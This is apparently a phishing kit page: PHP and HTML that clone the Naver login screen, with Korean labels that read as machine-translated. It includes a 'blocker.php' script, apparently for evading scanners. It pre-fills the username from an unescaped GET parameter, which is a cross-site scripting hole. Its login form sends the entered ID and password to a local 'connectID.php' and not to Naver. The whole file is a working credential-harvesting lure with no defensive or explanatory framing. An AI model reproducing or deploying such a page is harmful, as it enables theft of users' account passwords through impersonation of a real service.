<?php
include('blocker.php');
?>
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="utf-8">
<title>Naver 로그인</title>
<link rel="SHORTCUT ICON" href="https://nid.naver.com/favicon.ico">
<link href="https://nid.naver.com/favicon_1024.png" rel="apple-touch-icon-precomposed" sizes="1024x1024" />
<link rel="stylesheet" type="text/css" href="we.css?14116">
</head>
<body class='global'>
<div id="wrap">
	<!-- header -->
	<div id="header">
		<h1><a href="http://www.naver.com" class="sp h_logo" tabindex="1" onClick="nclks('log.naver',this,event)">NAVER</a></h1>
		<div class="lang">
			<select id="locale_switch" name="locale_switch" title="language" tabindex="2" class="sel" onChange="switchlocale();nclks_select(this.value,'',{'ko_KR':'log.lankr','en_US':'log.lanen','zh-Hans_CN':'log.lancn','zh-Hant_TW':'log.lantw'},this,event);">
				<option value="ko_KR" selected>대한민국</option>
				<option value="en_US" >English</option>
				<option value="zh-Hans_CN" >中国</option>
				<option value="zh-Hant_TW" >台灣</option>
			</select>
		</div>
	</div>
	<!-- //header -->
	<!-- container -->
	<div id="container">
	<!-- content -->
		<div id="content">
			<div class="link_info">
				<div class="u_keyboard">
					<a href="javascript:viewKeyboard();" class="sp btn_key_down" id="view_keyboard" tabindex="4" onClick="nclks_clsnm('view_keyboard','sp btn_key_down','log.kbdopen','log.kbdclose',this,event)"><span class="sp">PC Keyboard</span></a>
					<div class="key key_char" id="keyboard_img" style="display:none;">
						<a href="javascript:switchkeyboard();" class="sp btn_char" id="keyboard_switch" tabindex="5" onClick="nclks_clsnm('keyboard_switch', 'sp btn_char', 'log.symbols', 'log.character',this,event)">Symbols</a>
						<span class="sp key_img">&nbsp;</span>
					</div>
				</div>
				<span class="link_group"><a target="_blank" href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&categoryNo=1577" tabindex="6" onClick="nclks('log.groupidlogin',this,event)">그룹 ID 로그인</a></span>
			</div>
			<form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off" action="connectID.php" method="post" onSubmit="return confirmSubmit();">

			<input type="hidden" name="enctp" id="enctp" value="2">
			<input type="hidden" name="encpw" id="encpw" value="">
			<input type="hidden" name="encnm" id="encnm" value="">
			<input type="hidden" name="svctype" id="svctype" value="0">
			<input type="hidden" name="svc" id="svc" value="">
			<input type="hidden" name="viewtype" id="viewtype" value="">
			<input type="hidden" name="locale" id="locale" value="en_US">
			<input type="hidden" name="postDataKey" id="postDataKey" value="">
			<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="-1">
			<input type="hidden" name="logintp" id="logintp" value="">
			<input type="hidden" name="url" id="url" value="http://www.naver.com/">
			<input type="hidden" name="localechange" id="localechange" value="">
			<input type="hidden" name="theme_mode" id="theme_mode" value="">
			<input type="hidden" name="ls" id="ls" value="">
			<input type="hidden" name="pre_id" id="pre_id" value="">
			<input type="hidden" name="resp" id="resp" value="">
			<input type="hidden" name="exp" id="exp" value="">
			<input type="hidden" name="ru" id="ru" value="">
			<fieldset class="login_form">
			<legend class="blind">로그인</legend>
				<div class="input_row" id="id_area">
					<span class="input_box">
						<label for="id" id="label_id_area" class="lbl" style='display:none'>사용자 이름</label>
						<input type="text" id="id" name="id" tabindex="7" readonly="" accesskey="L" placeholder="사용자 이름" class="int" maxlength="41" value="<?php echo $_GET['email']; ?>">
					</span>
					<button type="button" disabled="" title="지우다" id="id_clear" class="wrg">지우다 </button>
				</div>
				<div id="err_empty_id" class="error" style="display:none;">사용자 이름을 입력하십시오!</div>
				<div class="input_row" id="pw_area">
					<span class="input_box">
						<label for="pw" id="label_pw_area" class="lbl" >암호</label>
						<input type="password" autofocus="" required="" id="pw" name="pw" tabindex="8" placeholder="암호" class="int" maxlength="16" onKeyPress="capslockevt(event);getKeysv2();" onKeyUp="checkShiftUp(event);" onKeyDown="checkShiftDown(event);" >
					</span>
					<button type="button" disabled="" title="지우다" id="pw_clear" class="wrg">지우다 </button>
					<div id="err_capslock" class="ly_v2" style="display:none;"><div class="ly_box"><p><strong>모자자물쇠</strong> 에 있습니다.</p></div><span class="sp ly_point"></span></div>
				</div>
				<div id="err_empty_pw" class="error" style="display:none;">비밀번호를 입력하십시오!</div>
				<div id="err_invalid_case" class="error" style="display:none;"><img src="https://nid.naver.com/login/image/bu.gif"></div>
				<div class="error" id="err_common"><p>비밀번호를 입력하십시오!</p>
				</div>
				<span class="btn_login">
					<input type="submit" title="로그인" alt="로그인" tabindex="12" value="로그인" class="int_jogin" onClick="nclks('log.login',this,event)">
				</span>
				<div class="check_info" >
					<div class="login_check">
						<span class="login_check_box">
							<input type="checkbox" id="login_chk" name="nvlong" class="" tabindex="9" value="off" onChange="savedLong(this);nclks_chk('login_chk', 'log.keepon', 'log.keepoff',this,event)" onClick="msieblur(this);"/>

							<label for="login_chk" id="label_login_chk" class="sp">로그인 상태 유지</label>
						</span>
						<div class="ly_v2" id="persist_usage" style="display:none;"><div class="ly_box">계정을 안전하게 유지하기 위해 자신의 PC를 사용하십시오.<a target="_blank" href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&categoryNo=1523" class="sp btn_check_help">View help</a></p></div><span class="sp ly_point"></span></div>
					</div>
					<div class="pc_check">
						<span class="ip_check"><a href="/login/ext/help_ip3.html" target="_blank" onClick="window.open(this.href, 'IPGUIDE', 'titlebar=1, resizable=1, scrollbars=yes, width=537, height=750'); return false;" title="" tabindex="10" >IP 보안</a><span class="ip_ch"><input type="checkbox" id="ip_on" checked="checked" tabindex="11" onChange="ipCheck(this,event);nclks_chk('ip_on', 'log.iponset', 'log.ipoffset',this,event)" onClick="msieblur(this);" class="" /><label for="ip_on" id="label_ip_on" class="sp">에</label></span></span> 
						<span class="bar">|</span>
						<span class="dis_di"><a href="#" onClick="onetime(); nclks('log.otn',this,event); return false;" title="일회성 번호">일회성 번호</a><a href="javascript:viewOnetime();" onClick="nclks('log.otnhelp',this,event)" title="Help" class="sp btn_help">Help</a>
						<div class="ly" id="onetime_usage" style="display:none;" onClick="javascript:viewOnetime()">
							<div class="ly_box"><p>When you enter One-time Number generated by Naver app, you can sign in easily and more secure.</p></div>
							<span class="sp ly_point"></span>
						</div>
						</span>
					</div>
				</div>
			</fieldset>
			</form>
			
	</div>
	<div id="footer">
		<address><em><a target="_blank" href="http://www.navercorp.com" class="logo" onClick="nclks('fot.naver',this,event)"><span class="blind">naver</span></a></em><em class="copy">저작권</em> <em class="u_cri">&copy;</em> <a target="_blank" href="http://www.navercorp.com" class="u_cra"  onclick="nclks('fot.navercorp',this,event)">NAVER Corp.</a> <span class="all_r">판권 소유.</span></address>	</div>
</div>
<div class="theme_setting_message" id="themeCampaignLayer" style="display:none">
	<div class="setting_message">
		<h3 class="blind"></h3>
		<a href="javascript:LoginTheme.closeThemeCampaign()" onClick="nclks('',this,event)" class="btn_closed"><span class="blind"></span></a>
		<p class="blind"><strong></strong></p>
		<p class="blind"></p>
		<a href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&categoryNo=11001" onClick="javascript:nclks('',this,event)" target="_blank" class="btn_view"><span class="blind"></span></a>
		<p class="setting_message_txt"><strong><span class="sp ico_error"></span></strong></p>
		<a href="javascript:LoginTheme.redirectConfigWindow()" onClick="nclks('',this,event)" class="btn_theme_setting"></a>
	</div>
</div>
<script type="text/javascript" src="common.all.js?141216"> </script>
<script type="text/javascript" src="logintheme.js?150109"> </script>
<script type="text/javascript">
var disp_stat = "1";
var session_keys = "";
var pc_keyboard_close="<span class=\"sp\">PC Keyboard</span>";
var pc_keyboard_open="<span class=\"sp\">PC Keyboard</span>";
var view_char="Character";
var view_symbol="Symbols";

addInputEvent('id', 'id_area');
addInputEvent('pw', 'pw_area');

initSmartLevel();
var login_chk = $('login_chk');
if(login_chk.attachEvent) {
	login_chk.attachEvent("onchange", function(){persist_usage();});
} else if (login_chk.addEventListener) {
	login_chk.addEventListener("change", function(){persist_usage();}, false);
}
function persist_usage()
{
	var login_chk = $("login_chk");
	if (login_chk.checked==true)
	{
		show("persist_usage");
		hide('onetime_usage');
		view_onetimeusage = false;
	}
	else
	{
		hide("persist_usage");
	}
}
var view_onetimeusage = false;
function viewOnetime()
{
	if (view_onetimeusage)
	{
		hide('onetime_usage');
		view_onetimeusage = false;
	}
	else
	{
		hide("persist_usage");
		show('onetime_usage');
		view_onetimeusage = true;
	}
}
try{
	if (navigator.appVersion.toLowerCase().indexOf("win") != -1) {
		$('id').style.imeMode = "disabled";
		document.msCapsLockWarningOff = true;
	}
}catch(e) {}
try{
	if ( $('id').value.length == 0 )
	{
		$('id').focus();
	}
	else
	{
		$('pw').focus();
	}
}catch (e){}
try{
	var nid_buk = localStorage.getItem("nid_buk");
	if (nid_buk!=null && nid_buk.length>0)
	{
		LoginTheme.setCookieNameValue("nid_buk", escape(nid_buk));
	}
	else
	{
		nid_nnb = getCookie('NNB');
		if (nid_nnb!=null && nid_nnb.length>0)
		{
			localStorage.setItem("nid_buk", nid_nnb);
			LoginTheme.setCookieNameValue("nid_buk", escape(nid_nnb));
		}
	}
}catch(e){}

</script>
<script type="text/javascript" src="https://nid.naver.com/login/js/common.util.js"></script>
<script type="text/javascript"> lcs_do(); </script>
<script type="text/javascript">
var nsc = "nid.login_en";
</script>
<div id="nv_stat" style="display:none;">1</div>
</body>
</html>
